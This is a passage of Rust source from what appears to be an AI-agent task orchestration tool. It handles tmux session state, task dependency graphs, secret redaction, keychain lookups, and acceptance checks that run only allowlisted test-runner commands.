                header: line.to_string(),
                lines: Vec::new(),
            });
            continue;
        }

        if let Some(hunk) = current_hunk.as_mut() {
            if line.starts_with('+')
                || line.starts_with('-')
                || line.starts_with(' ')
                || line.starts_with('\\')
            {
                hunk.lines.push(line.to_string());
            }
        }
    }

    if let Some(hunk) = current_hunk {
        if let Some(file) = current_file.as_mut() {
            file.hunks.push(hunk);
        }
    }
    if let Some(file) = current_file {
        files.push(file);
    }
    files
}

fn tmux_name_from_session_id(session_id: &str) -> String {
    format!("pnevma_{}", session_id.replace('-', ""))
}

fn tmux_tmpdir_for_project(project_path: &Path) -> PathBuf {
    project_path.join(".pnevma").join("data").join("tmux")
}

async fn session_backend_alive(project_path: &Path, session_id: &str) -> bool {
    let name = tmux_name_from_session_id(session_id);
    let tmux_tmpdir = tmux_tmpdir_for_project(project_path);
    let _ = tokio::fs::create_dir_all(&tmux_tmpdir).await;
    TokioCommand::new(pnevma_session::resolve_binary("tmux"))
        .env("TMUX_TMPDIR", &tmux_tmpdir)
        .args(["has-session", "-t", &name])
        .status()
        .await
        .map(|status| status.success())
        .unwrap_or(false)
}

async fn reconcile_persisted_sessions(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
) -> Result<Vec<SessionRow>, String> {
    let rows = db
        .list_sessions(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;

    let mut out = Vec::with_capacity(rows.len());
    for mut row in rows {
        if row.status == "running" || row.status == "waiting" {
            let alive = session_backend_alive(project_path, &row.id).await;
            row.status = if alive {
                "waiting".to_string()
            } else {
                "complete".to_string()
            };
            row.pid = None;
            row.last_heartbeat = Utc::now();
            db.upsert_session(&row).await.map_err(|e| e.to_string())?;
        }
        out.push(row);
    }
    Ok(out)
}

fn session_status_to_string(status: &SessionStatus) -> String {
    match status {
        SessionStatus::Running => "running".to_string(),
        SessionStatus::Waiting => "waiting".to_string(),
        SessionStatus::Error => "error".to_string(),
        SessionStatus::Complete => "complete".to_string(),
    }
}

fn session_health_to_string(health: &SessionHealth) -> String {
    match health {
        SessionHealth::Active => "active".to_string(),
        SessionHealth::Idle => "idle".to_string(),
        SessionHealth::Stuck => "stuck".to_string(),
        SessionHealth::Waiting => "waiting".to_string(),
        SessionHealth::Error => "error".to_string(),
        SessionHealth::Complete => "complete".to_string(),
    }
}

fn parse_session_status(status: &str) -> SessionStatus {
    match status {
        "running" => SessionStatus::Running,
        "waiting" => SessionStatus::Waiting,
        "error" => SessionStatus::Error,
        _ => SessionStatus::Complete,
    }
}

fn parse_session_health(status: &str) -> SessionHealth {
    match status {
        "running" => SessionHealth::Waiting,
        "waiting" => SessionHealth::Waiting,
        "error" => SessionHealth::Error,
        _ => SessionHealth::Complete,
    }
}

fn session_row_from_meta(meta: &SessionMetadata) -> SessionRow {
    SessionRow {
        id: meta.id.to_string(),
        project_id: meta.project_id.to_string(),
        name: meta.name.clone(),
        r#type: Some("terminal".to_string()),
        status: session_status_to_string(&meta.status),
        pid: meta.pid.map(i64::from),
        cwd: meta.cwd.clone(),
        command: meta.command.clone(),
        branch: meta.branch.clone(),
        worktree_id: meta.worktree_id.map(|v| v.to_string()),
        started_at: meta.started_at,
        last_heartbeat: meta.last_heartbeat,
    }
}

fn live_session_view_from_meta(meta: &SessionMetadata) -> LiveSessionView {
    LiveSessionView {
        id: meta.id.to_string(),
        name: meta.name.clone(),
        status: session_status_to_string(&meta.status),
        health: session_health_to_string(&meta.health),
        pid: meta.pid.map(i64::from),
        cwd: meta.cwd.clone(),
        command: meta.command.clone(),
        started_at: meta.started_at,
        last_heartbeat: meta.last_heartbeat,
        exit_code: meta.exit_code,
        ended_at: meta.ended_at,
    }
}

fn live_session_view_from_row(row: &SessionRow) -> LiveSessionView {
    LiveSessionView {
        id: row.id.clone(),
        name: row.name.clone(),
        status: row.status.clone(),
        health: match row.status.as_str() {
            "running" => "active".to_string(),
            "waiting" => "waiting".to_string(),
            "error" => "error".to_string(),
            _ => "complete".to_string(),
        },
        pid: row.pid,
        cwd: row.cwd.clone(),
        command: row.command.clone(),
        started_at: row.started_at,
        last_heartbeat: row.last_heartbeat,
        exit_code: None,
        ended_at: None,
    }
}

fn session_meta_from_row(row: &SessionRow, data_root: &Path) -> Option<SessionMetadata> {
    let session_id = Uuid::parse_str(&row.id).ok()?;
    let project_id = Uuid::parse_str(&row.project_id).ok()?;

    let mut status = parse_session_status(&row.status);
    let mut health = parse_session_health(&row.status);
    if status == SessionStatus::Running {
        status = SessionStatus::Waiting;
        health = SessionHealth::Waiting;
    }

    Some(SessionMetadata {
        id: session_id,
        project_id,
        name: row.name.clone(),
        status,
        health,
        pid: row.pid.map(|v| v as u32),
        cwd: row.cwd.clone(),
        command: row.command.clone(),
        branch: row.branch.clone(),
        worktree_id: row
            .worktree_id
            .as_ref()
            .and_then(|v| Uuid::parse_str(v).ok()),
        started_at: row.started_at,
        last_heartbeat: row.last_heartbeat,
        scrollback_path: data_root
            .join("scrollback")
            .join(format!("{}.log", row.id))
            .to_string_lossy()
            .to_string(),
        exit_code: None,
        ended_at: None,
    })
}

fn task_row_to_contract(row: &TaskRow) -> Result<TaskContract, String> {
    let scope: Vec<String> = serde_json::from_str(&row.scope_json).map_err(|e| e.to_string())?;
    let dependencies: Vec<String> =
        serde_json::from_str(&row.dependencies_json).map_err(|e| e.to_string())?;
    let acceptance_criteria: Vec<Check> =
        serde_json::from_str(&row.acceptance_json).map_err(|e| e.to_string())?;
    let constraints: Vec<String> =
        serde_json::from_str(&row.constraints_json).map_err(|e| e.to_string())?;
    let id = Uuid::parse_str(&row.id).map_err(|e| e.to_string())?;

    Ok(TaskContract {
        id,
        title: row.title.clone(),
        goal: row.goal.clone(),
        scope,
        out_of_scope: Vec::new(),
        dependencies: dependencies
            .iter()
            .filter_map(|dep| Uuid::parse_str(dep).ok())
            .collect(),
        acceptance_criteria,
        constraints,
        priority: map_priority(&row.priority),
        status: parse_status(&row.status),
        assigned_session: None,
        branch: row.branch.clone(),
        worktree: row.worktree_id.clone(),
        prompt_pack: None,
        handoff_summary: row.handoff_summary.clone(),
        auto_dispatch: row.auto_dispatch,
        agent_profile_override: row.agent_profile_override.clone(),
        execution_mode: row.execution_mode.clone(),
        timeout_minutes: row.timeout_minutes,
        max_retries: row.max_retries,
        created_at: row.created_at,
        updated_at: row.updated_at,
    })
}

fn task_contract_to_row(task: &TaskContract, project_id: &str) -> Result<TaskRow, String> {
    Ok(TaskRow {
        id: task.id.to_string(),
        project_id: project_id.to_string(),
        title: task.title.clone(),
        goal: task.goal.clone(),
        scope_json: serde_json::to_string(&task.scope).map_err(|e| e.to_string())?,
        dependencies_json: serde_json::to_string(
            &task
                .dependencies
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>(),
        )
        .map_err(|e| e.to_string())?,
        acceptance_json: serde_json::to_string(&task.acceptance_criteria)
            .map_err(|e| e.to_string())?,
        constraints_json: serde_json::to_string(&task.constraints).map_err(|e| e.to_string())?,
        priority: map_priority_str(&task.priority).to_string(),
        status: status_to_str(&task.status).to_string(),
        branch: task.branch.clone(),
        worktree_id: task.worktree.clone(),
        handoff_summary: task.handoff_summary.clone(),
        created_at: task.created_at,
        updated_at: task.updated_at,
        auto_dispatch: task.auto_dispatch,
        agent_profile_override: task.agent_profile_override.clone(),
        execution_mode: task.execution_mode.clone(),
        timeout_minutes: task.timeout_minutes,
        max_retries: task.max_retries,
    })
}

fn task_row_to_view(row: TaskRow, cost_usd: Option<f64>) -> Result<TaskView, String> {
    let scope: Vec<String> = serde_json::from_str(&row.scope_json).map_err(|e| e.to_string())?;
    let dependencies: Vec<String> =
        serde_json::from_str(&row.dependencies_json).map_err(|e| e.to_string())?;
    let acceptance_criteria: Vec<Check> =
        serde_json::from_str(&row.acceptance_json).map_err(|e| e.to_string())?;
    let constraints: Vec<String> =
        serde_json::from_str(&row.constraints_json).map_err(|e| e.to_string())?;

    Ok(TaskView {
        id: row.id,
        project_id: row.project_id,
        title: row.title,
        goal: row.goal,
        scope,
        dependencies,
        acceptance_criteria,
        constraints,
        priority: row.priority,
        status: row.status,
        branch: row.branch,
        worktree_id: row.worktree_id,
        handoff_summary: row.handoff_summary,
        auto_dispatch: row.auto_dispatch,
        agent_profile_override: row.agent_profile_override,
        execution_mode: row.execution_mode,
        timeout_minutes: row.timeout_minutes,
        max_retries: row.max_retries,
        created_at: row.created_at,
        updated_at: row.updated_at,
        queued_position: None,
        cost_usd,
    })
}

/// Emit a `task_updated` event with the full task view when possible.
/// Falls back to just the task_id if fetching/converting the row fails.
async fn emit_enriched_task_event(emitter: &Arc<dyn EventEmitter>, db: &Db, task_id: &str) {
    let view = async {
        let row = db.get_task(task_id).await.ok()??;
        let cost = db.task_cost_total(task_id).await.ok();
        task_row_to_view(row, cost).ok()
    }
    .await;
    match view {
        Some(v) => {
            emitter.emit("task_updated", json!({"task": v}));
        }
        None => {
            emitter.emit("task_updated", json!({"task_id": task_id}));
        }
    }
}

/// Build a serializable session view from a SessionRow.
fn session_row_to_event_payload(row: &SessionRow) -> serde_json::Value {
    serde_json::to_value(live_session_view_from_row(row)).expect("LiveSessionView must serialize")
}

async fn load_texts(paths: &[String], project_path: &Path) -> Vec<String> {
    let project_canonical = match project_path.canonicalize() {
        Ok(p) => p,
        Err(_) => return Vec::new(),
    };
    let mut out = Vec::new();
    for path in paths {
        let candidate = if Path::new(path).is_absolute() {
            PathBuf::from(path)
        } else {
            project_path.join(path)
        };
        // Resolve symlinks and verify the path stays within the project root.
        let canonical = match candidate.canonicalize() {
            Ok(p) => p,
            Err(_) => continue,
        };
        if !canonical.starts_with(&project_canonical) {
            tracing::warn!(path = %path, "load_texts: path escapes project root, skipping");
            continue;
        }
        if let Ok(text) = tokio::fs::read_to_string(&canonical).await {
            out.push(text);
        }
    }
    out
}

async fn load_recent_knowledge_summaries(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    limit: usize,
) -> Vec<String> {
    let rows = db
        .list_artifacts(&project_id.to_string())
        .await
        .unwrap_or_default();
    let mut out = Vec::new();
    for row in rows.into_iter().filter(|row| {
        row.r#type == "adr" || row.r#type == "changelog" || row.r#type == "convention-update"
    }) {
        if out.len() >= limit {
            break;
        }
        let path = project_path.join(&row.path);
        let text = tokio::fs::read_to_string(path).await.unwrap_or_default();
        if text.trim().is_empty() {
            continue;
        }
        let snippet = text.chars().take(2_000).collect::<String>();
        out.push(format!(
            "artifact_type: {}\nartifact_path: {}\n{}",
            row.r#type, row.path, snippet
        ));
    }
    out
}

async fn emit_task_updated(db: &Db, project_id: Uuid, task_id: Uuid) {
    append_event(
        db,
        project_id,
        Some(task_id),
        None,
        "core",
        "TaskUpdated",
        json!({"task_id": task_id}),
    )
    .await;
}

async fn emit_task_status_changed(
    db: &Db,
    project_id: Uuid,
    task_id: Uuid,
    from: &TaskStatus,
    to: &TaskStatus,
) {
    append_event(
        db,
        project_id,
        Some(task_id),
        None,
        "core",
        "TaskStatusChanged",
        json!({
            "task_id": task_id,
            "from": status_to_str(from),
            "to": status_to_str(to),
            "reason": "dependency_refresh"
        }),
    )
    .await;
}

fn parse_dependency_ids(raw: &[String]) -> Result<Vec<Uuid>, String> {
    let mut out = Vec::with_capacity(raw.len());
    let mut seen = HashSet::with_capacity(raw.len());
    for item in raw {
        let parsed = Uuid::parse_str(item).map_err(|_| format!("invalid dependency id: {item}"))?;
        if seen.insert(parsed) {
            out.push(parsed);
        }
    }
    Ok(out)
}

fn parse_row_dependency_ids(row: &TaskRow) -> Vec<Uuid> {
    serde_json::from_str::<Vec<String>>(&row.dependencies_json)
        .unwrap_or_default()
        .into_iter()
        .filter_map(|dep| Uuid::parse_str(&dep).ok())
        .collect()
}

async fn validate_task_dependencies(
    db: &Db,
    project_id: Uuid,
    task_id: Uuid,
    dependencies: &[Uuid],
) -> Result<(), String> {
    if dependencies.iter().any(|dep| dep == &task_id) {
        return Err("task cannot depend on itself".to_string());
    }

    let rows = db
        .list_tasks(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;
    let mut task_ids = rows
        .iter()
        .filter_map(|row| Uuid::parse_str(&row.id).ok())
        .collect::<HashSet<_>>();
    task_ids.insert(task_id);

    for dep in dependencies {
        if !task_ids.contains(dep) {
            return Err(format!("dependency task not found in project: {dep}"));
        }
    }

    let mut graph = HashMap::<Uuid, Vec<Uuid>>::new();
    for row in rows {
        if let Ok(id) = Uuid::parse_str(&row.id) {
            graph.insert(id, parse_row_dependency_ids(&row));
        }
    }
    graph.insert(task_id, dependencies.to_vec());

    for dep in dependencies {
        let mut stack = vec![*dep];
        let mut visited = HashSet::new();
        while let Some(node) = stack.pop() {
            if node == task_id {
                return Err(format!(
                    "dependency cycle detected for task {task_id} via {dep}"
                ));
            }
            if !visited.insert(node) {
                continue;
            }
            if let Some(next) = graph.get(&node) {
                stack.extend(next.iter().copied());
            }
        }
    }

    Ok(())
}

async fn refresh_dependency_states(
    db: &Db,
    project_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
    state: &AppState,
) -> Result<(), String> {
    let mut rows = db
        .list_tasks(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;
    for row in &mut rows {
        let persisted = db
            .list_task_dependencies(&row.id)
            .await
            .map_err(|e| e.to_string())?;
        let mut from_json =
            serde_json::from_str::<Vec<String>>(&row.dependencies_json).unwrap_or_default();
        from_json.sort();
        let mut normalized = persisted;
        normalized.sort();
        if from_json != normalized {
            row.dependencies_json =
                serde_json::to_string(&normalized).map_err(|e| e.to_string())?;
            row.updated_at = Utc::now();
            db.update_task(row).await.map_err(|e| e.to_string())?;
        }
    }

    let completed = rows
        .iter()
        .filter(|row| row.status == "Done")
        .filter_map(|row| Uuid::parse_str(&row.id).ok())
        .collect::<HashSet<_>>();

    for row in rows {
        if row.status != "Planned" && row.status != "Ready" && row.status != "Blocked" {
            continue;
        }
        let mut task = task_row_to_contract(&row)?;
        let prev = task.status.clone();
        task.refresh_blocked_status(&completed);
        if task.status == prev {
            continue;
        }

        let next = task_contract_to_row(&task, &project_id.to_string())?;
        db.update_task(&next).await.map_err(|e| e.to_string())?;
        emit_task_status_changed(db, project_id, task.id, &prev, &task.status).await;
        emit_task_updated(db, project_id, task.id).await;
        if let Some(emitter) = emitter {
            emit_enriched_task_event(emitter, db, &task.id.to_string()).await;

            // Auto-dispatch: if the task became Ready and has auto_dispatch set, dispatch it.
            if row.auto_dispatch && task.status == TaskStatus::Ready {
                match dispatch_task(task.id.to_string(), emitter, state).await {
                    Ok(_) => {
                        tracing::info!(task_id = %task.id, "auto-dispatched task on dependency completion")
                    }
                    Err(e) => {
                        tracing::warn!(task_id = %task.id, error = %e, "auto-dispatch failed")
                    }
                }
            }
        }
    }
    Ok(())
}

fn required_arg(args: &HashMap<String, String>, key: &str) -> Result<String, String> {
    args.get(key)
        .cloned()
        .filter(|v| !v.trim().is_empty())
        .ok_or_else(|| format!("missing required command arg: {key}"))
}

fn optional_arg(args: &HashMap<String, String>, key: &str) -> Option<String> {
    args.get(key).cloned().filter(|v| !v.trim().is_empty())
}

fn json_value_from_arg(raw: &str) -> serde_json::Value {
    let trimmed = raw.trim();
    if trimmed.eq_ignore_ascii_case("true") {
        serde_json::Value::Bool(true)
    } else if trimmed.eq_ignore_ascii_case("false") {
        serde_json::Value::Bool(false)
    } else if let Ok(value) = trimmed.parse::<i64>() {
        json!(value)
    } else if let Ok(value) = serde_json::from_str::<serde_json::Value>(trimmed) {
        value
    } else {
        json!(raw)
    }
}

#[cfg(test)]
fn redact_patterns(input: &str) -> String {
    shared_redact_text(input, &[])
}

fn redact_text(input: &str, secrets: &[String]) -> String {
    shared_redact_text(input, secrets)
}

pub(crate) fn normalize_redaction_secrets(secrets: &[String]) -> Vec<String> {
    shared_normalize_secrets(secrets)
}

fn project_redaction_secret_registry() -> &'static StdRwLock<HashMap<Uuid, Vec<String>>> {
    static REGISTRY: OnceLock<StdRwLock<HashMap<Uuid, Vec<String>>>> = OnceLock::new();
    REGISTRY.get_or_init(|| StdRwLock::new(HashMap::new()))
}

pub(crate) fn register_project_redaction_secrets(project_id: Uuid, secrets: &[String]) {
    let normalized = normalize_redaction_secrets(secrets);
    match project_redaction_secret_registry().write() {
        Ok(mut registry) => {
            registry.insert(project_id, normalized);
        }
        Err(error) => {
            tracing::warn!(
                project_id = %project_id,
                %error,
                "failed to register project redaction secrets"
            );
        }
    }
}

pub(crate) fn clear_project_redaction_secrets(project_id: Uuid) {
    match project_redaction_secret_registry().write() {
        Ok(mut registry) => {
            registry.remove(&project_id);
        }
        Err(error) => {
            tracing::warn!(
                project_id = %project_id,
                %error,
                "failed to clear project redaction secrets"
            );
        }
    }
}

fn project_redaction_secrets(project_id: Uuid) -> Vec<String> {
    match project_redaction_secret_registry().read() {
        Ok(registry) => registry
            .get(&project_id)
            .cloned()
            .unwrap_or_else(build_secrets_list),
        Err(error) => {
            tracing::warn!(
                project_id = %project_id,
                %error,
                "failed to read project redaction secrets"
            );
            build_secrets_list()
        }
    }
}

pub(crate) async fn current_redaction_secrets(secrets: &Arc<RwLock<Vec<String>>>) -> Vec<String> {
    secrets.read().await.clone()
}

#[derive(Debug, Clone)]
pub(crate) struct StreamRedactor {
    buffer: StreamRedactionBuffer,
    secrets: Arc<RwLock<Vec<String>>>,
}

impl StreamRedactor {
    pub(crate) fn new(secrets: Arc<RwLock<Vec<String>>>) -> Self {
        Self {
            buffer: StreamRedactionBuffer::new(),
            secrets,
        }
    }

    pub(crate) async fn push_chunk(&mut self, chunk: &str) -> Option<String> {
        let secrets = current_redaction_secrets(&self.secrets).await;
        self.buffer.push_chunk(chunk, &secrets)
    }

    pub(crate) async fn finish(&mut self) -> Option<String> {
        let secrets = current_redaction_secrets(&self.secrets).await;
        self.buffer.finish(&secrets)
    }
}

fn redact_json_value(value: serde_json::Value, secrets: &[String]) -> serde_json::Value {
    shared_redact_json_value(value, secrets)
}

pub(crate) fn redact_payload_for_log_with_secrets(
    payload: serde_json::Value,
    secrets: &[String],
) -> serde_json::Value {
    redact_json_value(payload, secrets)
}

pub(crate) fn redact_payload_for_project_log(
    project_id: Uuid,
    payload: serde_json::Value,
) -> serde_json::Value {
    let secrets = project_redaction_secrets(project_id);
    redact_payload_for_log_with_secrets(payload, &secrets)
}

#[derive(Debug, Clone)]
struct OscAttention {
    code: String,
    body: String,
}

fn parse_osc_attention(chunk: &str) -> Vec<OscAttention> {
    let bytes = chunk.as_bytes();
    let mut out = Vec::new();
    let mut i = 0usize;

    while i + 2 < bytes.len() {
        if bytes[i] != 0x1b || bytes[i + 1] != b']' {
            i += 1;
            continue;
        }

        let mut j = i + 2;
        while j < bytes.len() && bytes[j] != b';' {
            if bytes[j] == 0x07
                || (bytes[j] == 0x1b && j + 1 < bytes.len() && bytes[j + 1] == b'\\')
            {
                break;
            }
            j += 1;
        }
        if j >= bytes.len() || bytes[j] != b';' {
            i += 1;
            continue;
        }

        let code = String::from_utf8_lossy(&bytes[i + 2..j]).trim().to_string();
        let body_start = j + 1;
        let mut body_end = None;
        let mut k = body_start;
        while k < bytes.len() {
            if bytes[k] == 0x07 {
                body_end = Some((k, k + 1));
                break;
            }
            if bytes[k] == 0x1b && k + 1 < bytes.len() && bytes[k + 1] == b'\\' {
                body_end = Some((k, k + 2));
                break;
            }
            k += 1;
        }

        let Some((end, next_i)) = body_end else {
            i += 1;
            continue;
        };

        if matches!(code.as_str(), "9" | "99" | "777") {
            let body = String::from_utf8_lossy(&bytes[body_start..end])
                .trim()
                .to_string();
            out.push(OscAttention { code, body });
        }
        i = next_i;
    }

    out
}

fn osc_level(code: &str) -> &'static str {
    match code {
        "777" => "critical",
        "99" => "warning",
        _ => "info",
    }
}

fn osc_title(code: &str) -> &'static str {
    match code {
        "777" => "Agent Attention (Urgent)",
        "99" => "Agent Attention",
        _ => "Agent Notification",
    }
}

#[allow(clippy::too_many_arguments)]
async fn create_notification_row(
    db: &Db,
    emitter: &Arc<dyn EventEmitter>,
    project_id: Uuid,
    task_id: Option<Uuid>,
    session_id: Option<Uuid>,
    title: &str,
    body: &str,
    level: Option<&str>,
    source: &str,
    secrets: &[String],
) -> Result<NotificationView, String> {
    let safe_title = redact_text(title, secrets);
    let safe_body = redact_text(body, secrets);
    let normalized_level = level
        .unwrap_or("info")
        .trim()
        .to_ascii_lowercase()
        .to_string();
    let id = Uuid::new_v4().to_string();
    let created_at = Utc::now();
    db.create_notification(&NotificationRow {
        id: id.clone(),
        project_id: project_id.to_string(),
        task_id: task_id.map(|value| value.to_string()),
        session_id: session_id.map(|value| value.to_string()),
        title: safe_title.clone(),
        body: safe_body.clone(),
        level: normalized_level.clone(),
        unread: true,
        created_at,
    })
    .await
    .map_err(|e| e.to_string())?;

    let out = NotificationView {
        id: id.clone(),
        task_id: task_id.map(|value| value.to_string()),
        session_id: session_id.map(|value| value.to_string()),
        title: safe_title,
        body: safe_body,
        level: normalized_level.clone(),
        unread: true,
        created_at,
    };
    append_event(
        db,
        project_id,
        task_id,
        session_id,
        "notification",
        "NotificationCreated",
        json!({
            "id": id,
            "title": out.title,
            "level": normalized_level,
            "source": source
        }),
    )
    .await;
    emitter.emit("notification_created", json!(out.clone()));
    Ok(out)
}

async fn store_keychain_secret(service: &str, account: &str, value: &str) -> Result<(), String> {
    // Use the security-framework crate to avoid passing the password as a CLI arg
    // (which would expose it in `ps` output).
    #[cfg(target_os = "macos")]
    {
        use security_framework::passwords::set_generic_password;
        set_generic_password(service, account, value.as_bytes()).map_err(|e| e.to_string())
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _ = (service, account, value);
        Err("keychain not supported on this platform".to_string())
    }
}

async fn read_keychain_secret(service: &str, account: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    {
        use security_framework::passwords::get_generic_password;

        let bytes = get_generic_password(service, account).map_err(|e| e.to_string())?;
        String::from_utf8(bytes).map_err(|e| e.to_string())
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _ = (service, account);
        Err("keychain not supported on this platform".to_string())
    }
}

async fn resolve_secret_env(
    db: &Db,
    project_id: Uuid,
) -> Result<(Vec<(String, String)>, Vec<String>), String> {
    let refs = db
        .list_secret_refs(&project_id.to_string(), None)
        .await
        .map_err(|e| e.to_string())?;
    let mut env = Vec::with_capacity(refs.len());
    let mut values = Vec::with_capacity(refs.len());
    for secret in refs {
        let value =
            read_keychain_secret(&secret.keychain_service, &secret.keychain_account).await?;
        match pnevma_agents::validate_agent_env_entry(&secret.name, &value) {
            Ok(()) => env.push((secret.name.clone(), value.clone())),
            Err(error) => tracing::warn!(
                name = %secret.name,
                project_id = %project_id,
                %error,
                "skipping unsafe secret environment variable"
            ),
        }
        values.push(value);
    }
    Ok((env, values))
}

async fn git_output(dir: &Path, args: &[&str]) -> Result<String, String> {
    let out = TokioCommand::new("git")
        .args(args)
        .current_dir(dir)
        .output()
        .await
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

#[derive(Debug, Clone)]
struct CheckExecution {
    description: String,
    check_type: String,
    command: Option<String>,
    passed: bool,
    output: Option<String>,
}

fn split_test_command(command: &str) -> Result<(String, Vec<String>), String> {
    const MAX_TEST_COMMAND_ARGS: usize = 32;
    const MAX_TEST_COMMAND_ARG_BYTES: usize = 512;

    let parts = command
        .split_whitespace()
        .map(ToString::to_string)
        .collect::<Vec<_>>();
    let Some(program) = parts.first().cloned() else {
        return Err("TestCommand rejected: command must not be empty".to_string());
    };
    if parts.len() > MAX_TEST_COMMAND_ARGS {
        return Err(format!(
            "TestCommand rejected: command exceeds {MAX_TEST_COMMAND_ARGS} argv segments"
        ));
    }
    if parts
        .iter()
        .any(|part| part.is_empty() || part.len() > MAX_TEST_COMMAND_ARG_BYTES)
    {
        return Err(format!(
            "TestCommand rejected: each argv segment must be between 1 and {MAX_TEST_COMMAND_ARG_BYTES} bytes"
        ));
    }

    Ok((program, parts.into_iter().skip(1).collect()))
}

async fn run_acceptance_checks_for_task(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    task: &TaskContract,
) -> Result<(CheckRunRow, Vec<CheckResultRow>, bool), String> {
    let run_id = Uuid::new_v4().to_string();
    let mut rows = Vec::with_capacity(task.acceptance_criteria.len());
    let mut all_automated_passed = true;
    let mut any_automated = false;
    let worktree = if task.worktree.is_some() {
        db.find_worktree_by_task(&task.id.to_string())
            .await
            .map_err(|e| e.to_string())?
    } else {
        None
    };
    let worktree_path = worktree
        .as_ref()
        .map(|row| PathBuf::from(&row.path))
        .unwrap_or_else(|| project_path.to_path_buf());

    for check in &task.acceptance_criteria {
        let execution = match check.check_type {
            CheckType::ManualApproval => CheckExecution {
                description: check.description.clone(),
                check_type: "ManualApproval".to_string(),
                command: check.command.clone(),
                passed: true,
                output: Some("manual approval required".to_string()),
            },
            CheckType::FileExists => {
                any_automated = true;
                let candidate = if let Some(command) = &check.command {
                    if Path::new(command).is_absolute() {
                        PathBuf::from(command)
                    } else {
                        worktree_path.join(command)
                    }
                } else if Path::new(&check.description).is_absolute() {
                    PathBuf::from(&check.description)
                } else {
                    worktree_path.join(&check.description)
                };
                let passed = candidate.exists();
                if !passed {
                    all_automated_passed = false;
                }
                CheckExecution {
                    description: check.description.clone(),
                    check_type: "FileExists".to_string(),
                    command: check.command.clone(),
                    passed,
                    output: Some(format!("path checked: {}", candidate.to_string_lossy())),
                }
            }
            CheckType::TestCommand => {
                any_automated = true;
                let command = check
                    .command
                    .clone()
                    .filter(|v| !v.trim().is_empty())
                    .unwrap_or_else(|| check.description.clone());

                // Validate command against known-safe test runner prefixes.
                // Reject commands with shell metacharacters that could enable injection.
                const ALLOWED_PREFIXES: &[&str] = &[
                    "cargo test",
                    "cargo nextest",
                    "npm test",
                    "npm run test",
                    "npx",
                    "yarn test",
                    "yarn run test",
                    "pytest",
                    "python -m pytest",
                    "just test",
                    "just check",
                    "swift test",
                    "xcodebuild test",
                    "go test",
                    "make test",
                    "bun test",
                    "deno test",
                    "vitest",
                    "jest",
                ];
                let cmd_trimmed = command.trim();
                let has_invalid_chars = cmd_trimmed
                    .chars()
                    .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
                let has_allowed_prefix = ALLOWED_PREFIXES
                    .iter()
                    .any(|prefix| cmd_trimmed.starts_with(prefix));
                if has_invalid_chars || !has_allowed_prefix {
                    return Err(format!(
                        "TestCommand rejected: command must start with a known test runner \
                         and contain only safe characters [a-zA-Z0-9 _./:=,+@-]. Got: {cmd_trimmed:?}"
                    ));
                }

                let (program, args) = split_test_command(&command)?;
                let out = TokioCommand::new(&program)
                    .args(&args)
                    .current_dir(&worktree_path)
                    .output()
                    .await
                    .map_err(|e| e.to_string())?;
                let passed = out.status.success();
                if !passed {
                    all_automated_passed = false;
                }
                let stdout = String::from_utf8_lossy(&out.stdout);
                let stderr = String::from_utf8_lossy(&out.stderr);
                let mut text = String::new();
                if !stdout.trim().is_empty() {
                    text.push_str(stdout.trim());
                }
                if !stderr.trim().is_empty() {
                    if !text.is_empty() {
                        text.push('\n');
                    }
                    text.push_str(stderr.trim());
                }
                CheckExecution {
                    description: check.description.clone(),
                    check_type: "TestCommand".to_string(),
                    command: Some(command),
                    passed,
                    output: if text.is_empty() { None } else { Some(text) },
                }
            }
        };

        let result_row = CheckResultRow {
            id: Uuid::new_v4().to_string(),
            check_run_id: run_id.clone(),
            project_id: project_id.to_string(),
            task_id: task.id.to_string(),
            description: execution.description,
            check_type: execution.check_type,
            command: execution.command,
            passed: execution.passed,
            output: execution.output,
            created_at: Utc::now(),
        };
        rows.push(result_row);
    }

    if !any_automated {
        all_automated_passed = true;
    }

    let summary = if rows.is_empty() {
        "no checks configured".to_string()
    } else {
        let passed = rows.iter().filter(|r| r.passed).count();
        format!("{passed}/{} checks passed", rows.len())
    };
    let run_row = CheckRunRow {
        id: run_id.clone(),
        project_id: project_id.to_string(),
        task_id: task.id.to_string(),
        status: if all_automated_passed {
            "passed".to_string()
        } else {
            "failed".to_string()
        },
        summary: Some(summary),
        created_at: Utc::now(),
    };
    db.create_check_run(&run_row)
        .await
        .map_err(|e| e.to_string())?;
    for row in &rows {
        db.create_check_result(row)
            .await
            .map_err(|e| e.to_string())?;
    }
    append_event(
        db,
        project_id,
        Some(task.id),
        None,
        "core",
        "AcceptanceCheckRun",
        json!({
            "task_id": task.id,
            "check_run_id": run_id,
            "status": run_row.status,
            "summary": run_row.summary
        }),
    )
    .await;

    Ok((run_row, rows, all_automated_passed))
}

#[allow(clippy::too_many_arguments)]
async fn generate_review_pack(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    target_branch: &str,
    task: &TaskContract,
    check_run: &CheckRunRow,
    check_results: &[CheckResultRow],
    cost_usd: f64,
    summary: Option<&str>,
    secrets: &[String],
) -> Result<ReviewRow, String> {
    let branch = task
        .branch
        .clone()
        .ok_or_else(|| "task branch missing".to_string())?;
    let worktree = db
        .find_worktree_by_task(&task.id.to_string())
        .await
        .map_err(|e| e.to_string())?
        .ok_or_else(|| "task worktree missing".to_string())?;
    let worktree_path = PathBuf::from(&worktree.path);

    let diff = redact_text(
        &git_output(&worktree_path, &["diff", "--", "."]).await?,
        secrets,
    );
    let changed_files_raw = git_output(&worktree_path, &["diff", "--name-only", "--", "."]).await?;
    let changed_files = changed_files_raw
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(ToString::to_string)
        .collect::<Vec<_>>();

    let stats = git_output(
        project_path,
        &[
            "diff",
            "--shortstat",
            &format!("{target_branch}...{branch}"),
        ],
